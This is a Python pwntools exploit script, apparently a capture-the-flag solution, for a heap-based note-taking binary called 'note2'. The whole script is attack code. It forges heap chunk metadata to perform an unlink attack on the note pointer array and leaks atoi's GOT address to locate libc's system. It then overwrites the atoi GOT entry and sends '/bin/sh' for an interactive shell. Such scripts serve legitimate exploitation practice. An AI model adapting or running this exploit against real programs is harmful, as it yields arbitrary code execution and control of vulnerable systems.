#!/usr/bin/python
# -*- coding: <encoding name> -*-

from pwn import *
import time,sys,binascii

elf_name = "./note2"
elf = ELF(elf_name)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = process(elf_name)
gdb.attach(io, "b *0x4009F2")

def newnote(size, content):
    io.recvuntil('option--->>')
    io.sendline(str(1))
    io.recvuntil('(less than 128)')
    io.sendline(str(size))
    io.sendline(content)

def shownote(id):
    io.recvuntil('option--->>')
    io.sendline(str(2))
    io.recvuntil('note:')
    io.sendline(str(id))

def editnote(id, c, content):
    io.recvuntil('option--->>')
    io.sendline(str(3))
    io.recvuntil('note:')
    io.sendline(str(id))
    io.recvuntil('[1.overwrite/2.append]')
    io.sendline(str(c))
    io.sendline(content)

def deletenote(id):
    io.recvuntil('option--->>')
    io.sendline(str(4))
    io.recvuntil('note:')
    io.sendline(str(id))

def main():
    io.recvuntil('Input your name:')
    io.sendline('xdd')
    io.recvuntil('Input your address:')
    io.sendline('beijing')
    ptr_array = 0x602120
    fakefd = ptr_array - 0x18
    fakebk = ptr_array - 0x10
    payload = 'a' * 8
    payload += p64(0xa1)
    payload += p64(fakefd)
    payload += p64(fakebk)
    newnote(0x80, payload)
    newnote(0x0,'a'*8)
    newnote(0x80, 'b'*8)
    deletenote(1)

    payload = 'b' * 0x10
    payload += p64(0xa0)
    payload += p64(0x90)
    newnote(0x0, payload)
    deletenote(2)

    atoi_got = 0x602088
    payload = 'a' * 0x18 + p64(atoi_got)
    editnote(0,1,payload)

    shownote(0)
    io.recvuntil('Content is ')
    data = io.recvuntil('\n')[:-1]
    atoi_addr = u64(data.ljust(8,'\x00'))
    print 'atoi_addr is,', hex(atoi_addr)
    system_addr = atoi_addr - libc.symbols['atoi'] + libc.symbols['system']
    print 'system_addr is,', hex(system_addr)

    payload = p64(system_addr)
    editnote(0,1,payload)

    io.recvuntil('option--->>')
    io.sendline('/bin/sh')
    io.interactive()

if __name__ == '__main__':
    main()
